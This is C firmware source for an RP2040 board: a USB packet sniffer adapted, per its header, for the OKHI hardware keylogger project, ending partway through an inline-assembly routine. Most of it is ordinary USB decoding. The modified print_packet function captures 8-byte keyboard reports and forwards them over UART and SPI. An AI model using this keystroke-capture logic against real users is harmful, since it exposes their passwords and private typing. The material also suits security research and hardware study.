// SPDX-License-Identifier: BSD-3-Clause
// Copyright (c) 2022, Alex Taradov <alex@taradov.com>. All rights reserved.

/*
Dreg's note:

I've modified this project https://github.com/ataradov/usb-sniffer-lite 
for my own needs for the OKHI keylogger. I've added a lot of code that's 
pretty much junk and it kind of works... I'll improve it in the future.

Copyright (c) [2024] by David Reguera Garcia aka Dreg 
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es

Thx Alex Taradov <alex@taradov.com> for the original work!
*/

/*- Includes ----------------------------------------------------------------*/
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include "rp2040.h"
#include "hal_gpio.h"
#include "globals.h"
#include "utils.h"
#include "uart.h"
#include "spi.h"
#include "pio_asm.h"

#define STATUS_TIMEOUT     500000 // us

HAL_GPIO_PIN(OCS, 0, 13, sio_13)
HAL_GPIO_PIN(LED_O, 0, 25, sio_25)
HAL_GPIO_PIN(LED_R, 0, 26, sio_26)


INLINE int ospi_write_read_blocking(const uint8_t *src, uint8_t *dst, size_t len)
{
    HAL_GPIO_OCS_write(0);
    spi_write_read_blocking(spi1, src, dst, len);
    HAL_GPIO_OCS_write(1);
}


#define CONCATENATE_DETAIL(x, y) x##y
#define CONCATENATE(x, y) CONCATENATE_DETAIL(x, y)
#define MAKE_COMPILE_TIME_ASSERT(name, test) \
    typedef char CONCATENATE(assertion_failed_##name, __LINE__)[(test) ? 1 : -1]

MAKE_COMPILE_TIME_ASSERT(unsigned_int_size_is_not_4_bytes, sizeof(int) == 4);


/*- Definitions -------------------------------------------------------------*/
#define CAPTURE_ERROR_STUFF    (1 << 31)
#define CAPTURE_ERROR_CRC      (1 << 30)
#define CAPTURE_ERROR_PID      (1 << 29)
#define CAPTURE_ERROR_SYNC     (1 << 28)
#define CAPTURE_ERROR_NBIT     (1 << 27)
#define CAPTURE_ERROR_SIZE     (1 << 26)
#define CAPTURE_RESET          (1 << 25)
#define CAPTURE_LS_SOF         (1 << 24)
#define CAPTURE_MAY_FOLD       (1 << 23)

#define CAPTURE_ERROR_MASK     (CAPTURE_ERROR_STUFF | CAPTURE_ERROR_CRC | \
    CAPTURE_ERROR_PID | CAPTURE_ERROR_SYNC | CAPTURE_ERROR_NBIT | CAPTURE_ERROR_SIZE)

#define CAPTURE_SIZE_MASK      0xffff

/*- Types -------------------------------------------------------------------*/
typedef struct
{
  bool     fs;
  bool     trigger;
  int      limit;
  int      count;
  int      errors;
  int      resets;
  int      frames;
  int      folded;
} buffer_info_t;

typedef struct 
{
  uint32_t g_buffer[16000];
  buffer_info_t g_buffer_info;
} dbuff_t;


dbuff_t dbuff1;
dbuff_t dbuff2;



static volatile dbuff_t* last_dbuff = NULL;
static volatile dbuff_t* curr_dbuff = NULL;



int g_capture_speed   = CaptureSpeed_Full;
int g_capture_trigger = CaptureTrigger_Disabled;
int g_capture_limit   = CaptureLimit_Unlimited;
int g_display_time    = DisplayTime_SOF;
int g_display_data    = DisplayData_Full;
int g_display_fold    = DisplayFold_Enabled;

static int g_rd_ptr    = 0;
static int g_wr_ptr    = 0;
static int g_sof_index = 0;
static bool g_may_fold = false;

void display_putc(char c);
void display_puts(const char *s);
void display_puthex(uint32_t v, int size);
void display_putdec(uint32_t v, int size);

void display_buffer(void);


/*- Definitions -------------------------------------------------------------*/
#define ERROR_DATA_SIZE_LIMIT  16
#define MAX_PACKET_DELTA       10000 // us

/*- Variables ---------------------------------------------------------------*/
static uint32_t g_ref_time;
static uint32_t g_prev_time;
static bool g_check_delta;
static bool g_folding;
static int g_fold_count;
static int g_display_ptr;

/*- Implementations ---------------------------------------------------------*/

//-----------------------------------------------------------------------------
void display_putc(char c)
{
  uart1_putc(c);
}

//-----------------------------------------------------------------------------
void display_puts(const char *s)
{
  while (*s)
    display_putc(*s++);
}

//-----------------------------------------------------------------------------
void display_puthex(uint32_t v, int size)
{
  char buf[16];
  format_hex(buf, v, size);
  display_puts(buf);
}

//-----------------------------------------------------------------------------
void display_putdec(uint32_t v, int size)
{
  char buf[16];
  format_dec(buf, v, size);
  display_puts(buf);
}

//-----------------------------------------------------------------------------
static void print_errors(uint32_t flags, uint8_t *data, int size)
{
  flags &= CAPTURE_ERROR_MASK;

  display_puts("ERROR [");

  while (flags)
  {
    int bit = (flags & ~(flags-1));

    if (bit == CAPTURE_ERROR_STUFF)
      display_puts("STUFF");
    else if (bit == CAPTURE_ERROR_CRC)
      display_puts("CRC");
    else if (bit == CAPTURE_ERROR_PID)
      display_puts("PID");
    else if (bit == CAPTURE_ERROR_SYNC)
      display_puts("SYNC");
    else if (bit == CAPTURE_ERROR_NBIT)
      display_puts("NBIT");
    else if (bit == CAPTURE_ERROR_SIZE)
      display_puts("SIZE");

    flags &= ~bit;

    if (flags)
      display_puts(", ");
  }

  display_puts("]: ");

  if (size > 0)
  {
    display_puts("SYNC = 0x");
    display_puthex(data[0], 2);
    display_puts(", ");
  }

  if (size > 1)
  {
    display_puts("PID = 0x");
    display_puthex(data[1], 2);
    display_puts(", ");
  }

  if (size > 2)
  {
    bool limited = false;

    display_puts("DATA: ");

    if (size > ERROR_DATA_SIZE_LIMIT)
    {
      size = ERROR_DATA_SIZE_LIMIT;
      limited = true;
    }

    for (int i = 2; i < size; i++)
    {
      display_puthex(data[i], 2);
      display_putc(' ');
    }

    if (limited)
      display_puts("...");
  }

  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void print_sof(uint8_t *data)
{
  int frame = ((data[3] << 8) | data[2]) & 0x7ff;
  display_puts("SOF #");
  display_putdec(frame, 0);
  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void print_handshake(char *pid)
{
  display_puts(pid);
  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void print_in_out_setup(char *pid, uint8_t *data)
{
  int v = (data[3] << 8) | data[2];
  int addr = v & 0x7f;
  int ep = (v >> 7) & 0xf;

  display_puts(pid);
  display_puts(": 0x");
  display_puthex(addr, 2);
  display_puts("/");
  display_puthex(ep, 1);
  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void print_split(uint8_t *data)
{
  int addr = data[2] & 0x7f;
  int sc   = (data[2] >> 7) & 1;
  int port = data[3] & 0x7f;
  int s    = (data[3] >> 7) & 1;
  int e    = data[4] & 1;
  int et   = (data[4] >> 1) & 3;

  display_puts("SPLIT: HubAddr=0x");
  display_puthex(addr, 2);
  display_puts(", SC=");
  display_puthex(sc, 1);
  display_puts(", Port=");
  display_puthex(port, 2);
  display_puts(", S=");
  display_puthex(s, 1);
  display_puts(", E=");
  display_puthex(e, 1);
  display_puts(", ET=");
  display_puthex(et, 1);
  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void print_simple(char *text)
{
  display_puts(text);
  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void print_data(char *pid, uint8_t *data, int size)
{
  size -= 4;

  display_puts(pid);

  if (size == 0)
  {
    display_puts(": ZLP\r\n");
  }
  else
  {
    int limited = size;

    if (g_display_data == DisplayData_None)
      limited = 0;
    else if (g_display_data == DisplayData_Limit16)
      limited = LIMIT(size, 16);
    else if (g_display_data == DisplayData_Limit64)
      limited = LIMIT(size, 64);

    display_puts(" (");
    display_putdec(size, 0);
    display_puts("): ");

    for (int j = 0; j < limited; j++)
    {
      display_puthex(data[j+2], 2);
      display_putc(' ');
    }

    if (limited < size)
      display_puts("...");

    display_puts("\r\n");
  }
}

//-----------------------------------------------------------------------------
static void print_g_fold_count(int count)
{
  display_puts("   ... : Folded ");

  if (count == 1)
  {
    display_puts("1 frame");
  }
  else
  {
    display_putdec(count, 0);
    display_puts(" frames");
  }

  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void print_reset(void)
{
  display_puts("--- RESET ---\r\n");
}

//-----------------------------------------------------------------------------
static void print_ls_sof(void)
{
  display_puts("LS SOF\r\n");
}

//-----------------------------------------------------------------------------
static void print_time(int time)
{
  display_putdec(time, 6);
  display_puts(" : ");
}

/*
//-----------------------------------------------------------------------------
static bool print_packet(void)
{
  int flags = g_buffer[g_display_ptr];
  int time  = g_buffer[g_display_ptr+1];
  int ftime = time - g_ref_time;
  int delta = time - g_prev_time;
  int size  = flags & CAPTURE_SIZE_MASK;
  uint8_t *payload = (uint8_t *)&g_buffer[g_display_ptr+2];
  int pid = payload[1] & 0x0f;

  if (g_check_delta && delta > MAX_PACKET_DELTA)
  {
    display_puts("Time delta between packets is too large, possible buffer corruption.\r\n");
    return false;
  }

  g_display_ptr += (((size+3)/4) + 2);

  g_prev_time = time;
  g_check_delta = true;

  if (flags & CAPTURE_LS_SOF)
    pid = Pid_Sof;

  if ((g_display_time == DisplayTime_SOF && pid == Pid_Sof) || (g_display_time == DisplayTime_Previous))
    g_ref_time = time;

  if (g_folding)
  {
    if (pid != Pid_Sof)
      return true;

    if (flags & CAPTURE_MAY_FOLD)
    {
      g_fold_count++;
      return true;
    }

    print_g_fold_count(g_fold_count);
    g_folding = false;
  }

  if (flags & CAPTURE_MAY_FOLD && g_display_fold == DisplayFold_Enabled)
  {
    g_folding = true;
    g_fold_count = 1;
    return true;
  }

  print_time(ftime);

  if (flags & CAPTURE_RESET)
  {
    print_reset();

    if (g_display_time == DisplayTime_Reset)
      g_ref_time = time;

    g_check_delta = false;

    return true;
  }

  if (flags & CAPTURE_LS_SOF)
  {
    print_ls_sof();
    return true;
  }

  if (flags & CAPTURE_ERROR_MASK)
  {
    print_errors(flags, payload, size);
    return true;
  }

  if (pid == Pid_Sof)
    print_sof(payload);
  else if (pid == Pid_In)
    print_in_out_setup("IN", payload);
  else if (pid == Pid_Out)
    print_in_out_setup("OUT", payload);
  else if (pid == Pid_Setup)
    print_in_out_setup("SETUP", payload);

  else if (pid == Pid_Ack)
    print_handshake("ACK");
  else if (pid == Pid_Nak)
    print_handshake("NAK");
  else if (pid == Pid_Stall)
    print_handshake("STALL");
  else if (pid == Pid_Nyet)
    print_handshake("NYET");

  else if (pid == Pid_Data0)
    print_data("DATA0", payload, size);
  else if (pid == Pid_Data1)
    print_data("DATA1", payload, size);
  else if (pid == Pid_Data2)
    print_data("DATA2", payload, size);
  else if (pid == Pid_MData)
    print_data("MDATA", payload, size);

  else if (pid == Pid_Ping)
    print_simple("PING");
  else if (pid == Pid_PreErr)
    print_simple("PRE/ERR");
  else if (pid == Pid_Split)
    print_split(payload);
  else if (pid == Pid_Reserved)
    print_simple("RESERVED");

  return true;
}
*/


//-----------------------------------------------------------------------------
static bool print_packet(void)
{
  int flags = last_dbuff->g_buffer[g_display_ptr];
  int time  = last_dbuff->g_buffer[g_display_ptr+1];
  int ftime = time - g_ref_time;
  int delta = time - g_prev_time;
  int size  = flags & CAPTURE_SIZE_MASK;
  uint8_t *payload = (uint8_t *)&(last_dbuff->g_buffer[g_display_ptr+2]);
  int pid = payload[1] & 0x0f;
  static bool last_pid_in = false;
  static uint8_t *last_payload = NULL;

  last_payload = (uint8_t *)&(last_dbuff->g_buffer[g_display_ptr+2]);

  if (g_check_delta && delta > MAX_PACKET_DELTA)
  {
    //display_puts("Time delta between packets is too large, possible buffer corruption.\r\n");
    return false;
  }

  g_display_ptr += (((size+3)/4) + 2);

  g_prev_time = time;
  g_check_delta = true;

  if (flags & CAPTURE_LS_SOF)
    pid = Pid_Sof;

  if ((g_display_time == DisplayTime_SOF && pid == Pid_Sof) || (g_display_time == DisplayTime_Previous))
    g_ref_time = time;

  if (g_folding)
  {
    if (pid != Pid_Sof)
      return true;

    if (flags & CAPTURE_MAY_FOLD)
    {
      g_fold_count++;
      return true;
    }

    //print_g_fold_count(g_fold_count);
    g_folding = false;
  }

  if (flags & CAPTURE_MAY_FOLD && g_display_fold == DisplayFold_Enabled)
  {
    g_folding = true;
    g_fold_count = 1;
    return true;
  }

  //print_time(ftime);

  if (flags & CAPTURE_RESET)
  {
    //print_reset();

    if (g_display_time == DisplayTime_Reset)
      g_ref_time = time;

    g_check_delta = false;

    return true;
  }

  if (flags & CAPTURE_LS_SOF)
  {
    //print_ls_sof();
    return true;
  }

  if (flags & CAPTURE_ERROR_MASK)
  {
    //print_errors(flags, payload, size);
    return true;
  }

  if (pid == Pid_In)
  {
    last_pid_in = true;
  }
  else
  {
    if (last_pid_in && (pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2) && size - 4 == 8)
    {
        int v = (last_payload[3] << 8) | last_payload[2];
        int addr = v & 0x7f;
        int ep = (v >> 7) & 0xf;

        
        char pkts[256] = {0};
        size_t sizepkt = msprintf(pkts, "IN: 0x%x/%d 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x;\r\n", addr, ep, last_payload[2], last_payload[3], last_payload[4], last_payload[5], last_payload[6], last_payload[7], last_payload[8], last_payload[9]);

        uart1_puts(pkts);

        ospi_write_read_blocking(pkts, pkts, sizepkt);
        delay_ms(1);
    }

    last_pid_in = false;
  }

  return true;
}

//-----------------------------------------------------------------------------
void display_value(int value, char *name)
{
  display_putdec(value, 0);
  display_putc(' ');
  display_puts(name);

  if (value != 1)
    display_putc('s');
}

//-----------------------------------------------------------------------------
void display_buffer(void)
{
  if (last_dbuff->g_buffer_info.count == 0)
  {
    uart1_puts("\r\nCapture buffer is empty\r\n");
    return;
  }

  uart1_puts("\r\nCapture buffer:\r\n");

  g_ref_time    = last_dbuff->g_buffer[1];
  g_prev_time   = last_dbuff->g_buffer[1];
  g_folding     = false;
  g_check_delta = true;
  g_fold_count  = 0;
  g_display_ptr = 0;

  for (int i = 0; i < last_dbuff->g_buffer_info.count; i++)
  {
    if (!print_packet())
      break;
  }

  if (g_folding && g_fold_count)
    print_g_fold_count(g_fold_count);

  uart1_puts("\r\n");
  uart1_puts("Total: ");
  uart1_put_uint32_dec(last_dbuff->g_buffer_info.errors);
  uart1_puts(" error");
  uart1_puts(", ");
  uart1_put_uint32_dec(last_dbuff->g_buffer_info.resets);
  uart1_puts(" bus reset");
  uart1_puts(", ");
  uart1_put_uint32_dec(last_dbuff->g_buffer_info.count);
  uart1_puts(last_dbuff->g_buffer_info.fs ? " FS packet" : " LS packet");
  uart1_puts(", ");
  uart1_put_uint32_dec(last_dbuff->g_buffer_info.frames);
  uart1_puts(" frame");
  uart1_puts(", ");
  uart1_put_uint32_dec(last_dbuff->g_buffer_info.folded);
  uart1_puts(" empty frame");
  uart1_puts("\r\n\r\n");

}


/*- Prototypes --------------------------------------------------------------*/
void capture_init(void);
void capture_command(int cmd);

/*- Definitions -------------------------------------------------------------*/
#define CORE1_STACK_SIZE       512 // words

// DP and DM can be any pins, but they must be consequitive and in that order
#define DP_INDEX       20
#define DM_INDEX       21
#define START_INDEX    22

HAL_GPIO_PIN(DP,       0, 20, pio0_20)
HAL_GPIO_PIN(DM,       0, 21, pio0_21)
HAL_GPIO_PIN(START,    0, 22, pio1_22) // Internal trigger from PIO1 to PIO0
HAL_GPIO_PIN(TRIGGER,  0, 18, sio_18)

/*- Constants ---------------------------------------------------------------*/
static const uint16_t crc16_usb_tab[256] =
{
  0x0000, 0xc0c1, 0xc181, 0x0140, 0xc301, 0x03c0, 0x0280, 0xc241,
  0xc601, 0x06c0, 0x0780, 0xc741, 0x0500, 0xc5c1, 0xc481, 0x0440,
  0xcc01, 0x0cc0, 0x0d80, 0xcd41, 0x0f00, 0xcfc1, 0xce81, 0x0e40,
  0x0a00, 0xcac1, 0xcb81, 0x0b40, 0xc901, 0x09c0, 0x0880, 0xc841,
  0xd801, 0x18c0, 0x1980, 0xd941, 0x1b00, 0xdbc1, 0xda81, 0x1a40,
  0x1e00, 0xdec1, 0xdf81, 0x1f40, 0xdd01, 0x1dc0, 0x1c80, 0xdc41,
  0x1400, 0xd4c1, 0xd581, 0x1540, 0xd701, 0x17c0, 0x1680, 0xd641,
  0xd201, 0x12c0, 0x1380, 0xd341, 0x1100, 0xd1c1, 0xd081, 0x1040,
  0xf001, 0x30c0, 0x3180, 0xf141, 0x3300, 0xf3c1, 0xf281, 0x3240,
  0x3600, 0xf6c1, 0xf781, 0x3740, 0xf501, 0x35c0, 0x3480, 0xf441,
  0x3c00, 0xfcc1, 0xfd81, 0x3d40, 0xff01, 0x3fc0, 0x3e80, 0xfe41,
  0xfa01, 0x3ac0, 0x3b80, 0xfb41, 0x3900, 0xf9c1, 0xf881, 0x3840,
  0x2800, 0xe8c1, 0xe981, 0x2940, 0xeb01, 0x2bc0, 0x2a80, 0xea41,
  0xee01, 0x2ec0, 0x2f80, 0xef41, 0x2d00, 0xedc1, 0xec81, 0x2c40,
  0xe401, 0x24c0, 0x2580, 0xe541, 0x2700, 0xe7c1, 0xe681, 0x2640,
  0x2200, 0xe2c1, 0xe381, 0x2340, 0xe101, 0x21c0, 0x2080, 0xe041,
  0xa001, 0x60c0, 0x6180, 0xa141, 0x6300, 0xa3c1, 0xa281, 0x6240,
  0x6600, 0xa6c1, 0xa781, 0x6740, 0xa501, 0x65c0, 0x6480, 0xa441,
  0x6c00, 0xacc1, 0xad81, 0x6d40, 0xaf01, 0x6fc0, 0x6e80, 0xae41,
  0xaa01, 0x6ac0, 0x6b80, 0xab41, 0x6900, 0xa9c1, 0xa881, 0x6840,
  0x7800, 0xb8c1, 0xb981, 0x7940, 0xbb01, 0x7bc0, 0x7a80, 0xba41,
  0xbe01, 0x7ec0, 0x7f80, 0xbf41, 0x7d00, 0xbdc1, 0xbc81, 0x7c40,
  0xb401, 0x74c0, 0x7580, 0xb541, 0x7700, 0xb7c1, 0xb681, 0x7640,
  0x7200, 0xb2c1, 0xb381, 0x7340, 0xb101, 0x71c0, 0x7080, 0xb041,
  0x5000, 0x90c1, 0x9181, 0x5140, 0x9301, 0x53c0, 0x5280, 0x9241,
  0x9601, 0x56c0, 0x5780, 0x9741, 0x5500, 0x95c1, 0x9481, 0x5440,
  0x9c01, 0x5cc0, 0x5d80, 0x9d41, 0x5f00, 0x9fc1, 0x9e81, 0x5e40,
  0x5a00, 0x9ac1, 0x9b81, 0x5b40, 0x9901, 0x59c0, 0x5880, 0x9841,
  0x8801, 0x48c0, 0x4980, 0x8941, 0x4b00, 0x8bc1, 0x8a81, 0x4a40,
  0x4e00, 0x8ec1, 0x8f81, 0x4f40, 0x8d01, 0x4dc0, 0x4c80, 0x8c41,
  0x4400, 0x84c1, 0x8581, 0x4540, 0x8701, 0x47c0, 0x4680, 0x8641,
  0x8201, 0x42c0, 0x4380, 0x8341, 0x4100, 0x81c1, 0x8081, 0x4040,
};

static const uint8_t crc5_usb_tab[256] =
{
  0x00, 0x0e, 0x1c, 0x12, 0x11, 0x1f, 0x0d, 0x03, 0x0b, 0x05, 0x17, 0x19, 0x1a, 0x14, 0x06, 0x08,
  0x16, 0x18, 0x0a, 0x04, 0x07, 0x09, 0x1b, 0x15, 0x1d, 0x13, 0x01, 0x0f, 0x0c, 0x02, 0x10, 0x1e,
  0x05, 0x0b, 0x19, 0x17, 0x14, 0x1a, 0x08, 0x06, 0x0e, 0x00, 0x12, 0x1c, 0x1f, 0x11, 0x03, 0x0d,
  0x13, 0x1d, 0x0f, 0x01, 0x02, 0x0c, 0x1e, 0x10, 0x18, 0x16, 0x04, 0x0a, 0x09, 0x07, 0x15, 0x1b,
  0x0a, 0x04, 0x16, 0x18, 0x1b, 0x15, 0x07, 0x09, 0x01, 0x0f, 0x1d, 0x13, 0x10, 0x1e, 0x0c, 0x02,
  0x1c, 0x12, 0x00, 0x0e, 0x0d, 0x03, 0x11, 0x1f, 0x17, 0x19, 0x0b, 0x05, 0x06, 0x08, 0x1a, 0x14,
  0x0f, 0x01, 0x13, 0x1d, 0x1e, 0x10, 0x02, 0x0c, 0x04, 0x0a, 0x18, 0x16, 0x15, 0x1b, 0x09, 0x07,
  0x19, 0x17, 0x05, 0x0b, 0x08, 0x06, 0x14, 0x1a, 0x12, 0x1c, 0x0e, 0x00, 0x03, 0x0d, 0x1f, 0x11,
  0x14, 0x1a, 0x08, 0x06, 0x05, 0x0b, 0x19, 0x17, 0x1f, 0x11, 0x03, 0x0d, 0x0e, 0x00, 0x12, 0x1c,
  0x02, 0x0c, 0x1e, 0x10, 0x13, 0x1d, 0x0f, 0x01, 0x09, 0x07, 0x15, 0x1b, 0x18, 0x16, 0x04, 0x0a,
  0x11, 0x1f, 0x0d, 0x03, 0x00, 0x0e, 0x1c, 0x12, 0x1a, 0x14, 0x06, 0x08, 0x0b, 0x05, 0x17, 0x19,
  0x07, 0x09, 0x1b, 0x15, 0x16, 0x18, 0x0a, 0x04, 0x0c, 0x02, 0x10, 0x1e, 0x1d, 0x13, 0x01, 0x0f,
  0x1e, 0x10, 0x02, 0x0c, 0x0f, 0x01, 0x13, 0x1d, 0x15, 0x1b, 0x09, 0x07, 0x04, 0x0a, 0x18, 0x16,
  0x08, 0x06, 0x14, 0x1a, 0x19, 0x17, 0x05, 0x0b, 0x03, 0x0d, 0x1f, 0x11, 0x12, 0x1c, 0x0e, 0x00,
  0x1b, 0x15, 0x07, 0x09, 0x0a, 0x04, 0x16, 0x18, 0x10, 0x1e, 0x0c, 0x02, 0x01, 0x0f, 0x1d, 0x13,
  0x0d, 0x03, 0x11, 0x1f, 0x1c, 0x12, 0x00, 0x0e, 0x06, 0x08, 0x1a, 0x14, 0x17, 0x19, 0x0b, 0x05,
};

static const char *capture_speed_str[CaptureSpeedCount] =
{
  [CaptureSpeed_Low]  = "Low",
  [CaptureSpeed_Full] = "Full",
};

static const char *capture_trigger_str[CaptureTriggerCount] =
{
  [CaptureTrigger_Enabled]  = "Enabled",
  [CaptureTrigger_Disabled] = "Disabled",
};

static const char *capture_limit_str[CaptureLimitCount] =
{
  [CaptureLimit_100]       = "100 packets",
  [CaptureLimit_200]       = "200 packets",
  [CaptureLimit_500]       = "500 packets",
  [CaptureLimit_1000]      = "1000 packets",
  [CaptureLimit_2000]      = "2000 packets",
  [CaptureLimit_5000]      = "5000 packets",
  [CaptureLimit_10000]     = "10000 packets",
  [CaptureLimit_Unlimited] = "Unlimited",
};

static const char *display_time_str[DisplayTimeCount] =
{
  [DisplayTime_First]    = "Relative to the first packet",
  [DisplayTime_Previous] = "Relative to the previous packet",
  [DisplayTime_SOF]      = "Relative to the SOF",
  [DisplayTime_Reset]    = "Relative to the bus reset",
};

static const char *display_data_str[DisplayDataCount] =
{
  [DisplayData_Full]    = "Full",
  [DisplayData_Limit16] = "Limit to 16 bytes",
  [DisplayData_Limit64] = "Limit to 64 bytes",
  [DisplayData_None]    = "Do not display data",
};

static const char *display_fold_str[DisplayFoldCount] =
{
  [DisplayFold_Enabled]  = "Enabled",
  [DisplayFold_Disabled] = "Disabled",
};


/*- Variables ---------------------------------------------------------------*/


/*- Implementations ---------------------------------------------------------*/

//-----------------------------------------------------------------------------
static uint16_t crc16_usb(uint8_t *data, int size)
{
  uint16_t crc = 0xffff;

  for (int i = 0; i < size; i++)
    crc = crc16_usb_tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8);

  return crc;
}

//-----------------------------------------------------------------------------
static uint8_t crc5_usb(uint8_t *data, int size)
{
  uint8_t crc = 0xff;

  for (int i = 0; i < size; i++)
    crc = crc5_usb_tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8);

  return crc;
}

//-----------------------------------------------------------------------------
static void handle_folding(int pid, uint32_t error)
{
  if (error)
  {
    last_dbuff->g_buffer_info.errors++;
    set_error(true);
  }

  if (pid == Pid_Sof)
  {
    last_dbuff->g_buffer_info.frames++;

    if (g_may_fold)
    {
      last_dbuff->g_buffer[g_sof_index] |= CAPTURE_MAY_FOLD;
      last_dbuff->g_buffer_info.folded++;
    }

    g_sof_index = g_wr_ptr-2;
    g_may_fold = true;
  }
  else if (pid != Pid_In && pid != Pid_Nak)
  {
    g_may_fold = false;
  }

  if (error)
    g_may_fold = false;
}

//-----------------------------------------------------------------------------
static void process_packet(int size)
{
  uint8_t *out_data = (uint8_t *)&(last_dbuff->g_buffer[g_wr_ptr]);
  uint32_t v = 0x80000000;
  uint32_t error = 0;
  int out_size = 0;
  int out_bit = 0;
  int out_byte = 0;
  int stuff_count = 0;
  int pid, npid;

  while (size)
  {
    uint32_t w = last_dbuff->g_buffer[g_rd_ptr++];
    int bit_count;

    if (size < 31)
    {
      w <<= (30-size);
      bit_count = size;
    }
    else
    {
      bit_count = 31;
    }

    v ^= (w ^ (w << 1));

    for (int i = 0; i < bit_count; i++)
    {
      int bit = (v & 0x80000000) ? 0 : 1;

      v <<= 1;

      if (stuff_count == 6)
      {
        if (bit)
          error |= CAPTURE_ERROR_STUFF;

        stuff_count = 0;
        continue;
      }
      else if (bit)
        stuff_count++;
      else
        stuff_count = 0;

      out_byte |= (bit << out_bit);
      out_bit++;

      if (out_bit == 8)
      {
        out_data[out_size++] = out_byte;
        out_byte = 0;
        out_bit = 0;
      }
    }

    size -= bit_count;
  }

  if (out_bit)
    error |= CAPTURE_ERROR_NBIT;

  if (out_size < 1)
  {
    error |= CAPTURE_ERROR_SIZE;
    return;
  }

  if (out_data[0] != (last_dbuff->g_buffer_info.fs ? 0x80 : 0x81))
    error |= CAPTURE_ERROR_SYNC;

  if (out_size < 2)
  {
    error |= CAPTURE_ERROR_SIZE;
    return;
  }

  pid = out_data[1] & 0x0f;
  npid = (~out_data[1] >> 4) & 0x0f;

  if ((pid != npid) || (pid == Pid_Reserved))
    error |= CAPTURE_ERROR_PID;

  if (pid == Pid_Sof || pid == Pid_In || pid == Pid_Out || pid == Pid_Setup || pid == Pid_Ping || pid == Pid_Split)
  {
    if (((pid == Pid_Split) && (out_size != 5)) || ((pid != Pid_Split) && (out_size != 4)))
      error |= CAPTURE_ERROR_SIZE;
    else if (crc5_usb(&out_data[2], out_size-2) != 0x09)
      error |= CAPTURE_ERROR_CRC;
  }
  else if (pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2 || pid == Pid_MData)
  {
    if (out_size < 4)
      error |= CAPTURE_ERROR_SIZE;
    else if (crc16_usb(&out_data[2], out_size-2) != 0xb001)
      error |= CAPTURE_ERROR_CRC;
  }

  handle_folding(pid, error);

  last_dbuff->g_buffer[g_wr_ptr-2] = error | out_size;
  g_wr_ptr += (out_size + 3) / 4;
}

//-----------------------------------------------------------------------------
static uint32_t start_time(uint32_t end_time, uint32_t size)
{
  if (last_dbuff->g_buffer_info.fs)
    return end_time - ((size * 5461) >> 16); // Divide by 12
  else
    return end_time - ((size * 43691) >> 16); // Divide by 1.5
}

//-----------------------------------------------------------------------------
static void process_buffer(void)
{
  uint32_t time_offset = start_time(last_dbuff->g_buffer[1], last_dbuff->g_buffer[0]);
  int out_count = 0;

  g_rd_ptr = 0;
  g_wr_ptr = 0;
  g_sof_index = 0;
  g_may_fold = false;

  last_dbuff->g_buffer_info.errors = 0;
  last_dbuff->g_buffer_info.resets = 0;
  last_dbuff->g_buffer_info.frames = 0;
  last_dbuff->g_buffer_info.folded = 0;

  for (int i = 0; i < last_dbuff->g_buffer_info.count; i++)
  {
    uint32_t size = last_dbuff->g_buffer[g_rd_ptr];
    uint32_t time = start_time(last_dbuff->g_buffer[g_rd_ptr+1], size);

    if (size > 0xffff)
    {
      display_puts("Synchronization error. Check your speed setting.\r\n");
      out_count = 0;
      break;
    }

    last_dbuff->g_buffer[g_wr_ptr+1] = time - time_offset;
    g_rd_ptr += 2;
    g_wr_ptr += 2;
    out_count++;

    if (size == 0)
    {
      last_dbuff->g_buffer[g_wr_ptr-2] = CAPTURE_RESET;
      handle_folding(-1, 0); // Prevent folding of resets
      last_dbuff->g_buffer_info.resets++;
    }
    else if (size == 1)
    {
      if (last_dbuff->g_buffer_info.fs)
      {
        out_count--; // Discard the packet
        g_wr_ptr -= 2;
      }
      else
      {
        last_dbuff->g_buffer[g_wr_ptr-2] = CAPTURE_LS_SOF;
        handle_folding(Pid_Sof, 0); // Fold on LS SOFs
      }

      g_rd_ptr++;
    }
    else
    {
      process_packet(size-1);
    }
  }

  last_dbuff->g_buffer_info.count = out_count;
}

//-----------------------------------------------------------------------------
static int capture_limit_value(void)
{
  return 5000;

  if (g_capture_limit == CaptureLimit_100)
    return 100;
  else if (g_capture_limit == CaptureLimit_200)
    return 200;
  else if (g_capture_limit == CaptureLimit_500)
    return 500;
  else if (g_capture_limit == CaptureLimit_1000)
    return 1000;
  else if (g_capture_limit == CaptureLimit_2000)
    return 2000;
  else if (g_capture_limit == CaptureLimit_5000)
    return 5000;
  else if (g_capture_limit == CaptureLimit_10000)
    return 10000;
  else
    return 100000;
}

//-----------------------------------------------------------------------------
static int poll_cmd(void)
{
  if (SIO->FIFO_ST & SIO_FIFO_ST_VLD_Msk)
    return SIO->FIFO_RD;
  return 0;
}

//-----------------------------------------------------------------------------
static bool wait_for_trigger(void)
{
  if (!last_dbuff->g_buffer_info.trigger)
    return true;

  display_puts("Waiting for a trigger\r\n");

  while (1)
  {
    if (poll_cmd() == 'p')
      return false;

    if (HAL_GPIO_TRIGGER_read() == 0)
      return true;
  }
}



void func() {
    __asm volatile (
        ".syntax unified\n"
        ".align 4\n"
        
        "push {r4, r5, r6, lr}\n"
        "ldr r2, [pc, #56]\n"
        "ldr r3, [r2, #0]\n"
        "movs r6, #1\n"
        "bics r3, r6\n"
        "str r3, [r2, #0]\n"
        "movs r3, #128\n"
        "lsls r3, r3, #5\n"
        "ldr r1, [pc, #44]\n"
        "orrs r1, r3\n"
        "movs r0, #128\n"
        "lsls r0, r0, #24\n"
        "str r0, [r1, #0]\n"
        "str r0, [r1, #0]\n"
        "movs r1, #128\n"
        "lsls r1, r1, #6\n"
        "orrs r2, r1\n"
        "movs r5, #16\n"
        "str r5, [r2, #0]\n"
        "ldr r2, [pc, #28]\n"
        "ldr r4, [r2, #0]\n"
        "bics r4, r6\n"
        "str r4, [r2, #0]\n"
